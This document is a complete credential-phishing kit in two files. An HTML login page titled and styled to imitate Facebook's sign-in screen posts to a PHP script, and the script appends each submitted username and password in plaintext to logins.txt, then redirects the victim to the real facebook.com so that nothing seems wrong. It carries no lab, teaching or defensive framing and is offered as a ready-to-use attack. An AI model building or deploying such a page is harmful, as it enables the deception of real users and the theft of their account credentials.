login.html

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook – log in or sign up</title>
  <link rel="icon" href="facebook.ico" type="image/x-icon">
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #f0f2f5;
    }
    .container {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      padding: 15px;
    }
    .login-box {
      background: white;
      padding: 30px 20px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 360px;
      text-align: center;
    }
    .login-box img {
      width: 200px;
      margin-bottom: 20px;
    }
    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ddd;
      border-radius: 6px;
      font-size: 16px;
    }
    button {
      width: 100%;
      padding: 12px;
      background: #1877f2;
      border: none;
      color: white;
      font-size: 18px;
      border-radius: 6px;
      cursor: pointer;
    }
    button:hover {
      background: #166fe5;
    }
    .small {
      font-size: 12px;
      color: gray;
      margin-top: 15px;
    }
  </style>
</head>

<body>
  <div class="container">
   <form action="login.php" method="POST">
  <input type="text" name="username" />
  <input type="password" name="password" />
  <button type="submit">Log In</button>
</form>

  </div>
</body>

</html>



login.php





<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $user = $_POST["username"];
    $pass = $_POST["password"];

    $data = "Username: $user | Password: $pass\n";
    file_put_contents("logins.txt", $data, FILE_APPEND);

    // Optional: Redirect after login
    header("Location: https://facebook.com"); 
    exit();
}
?>

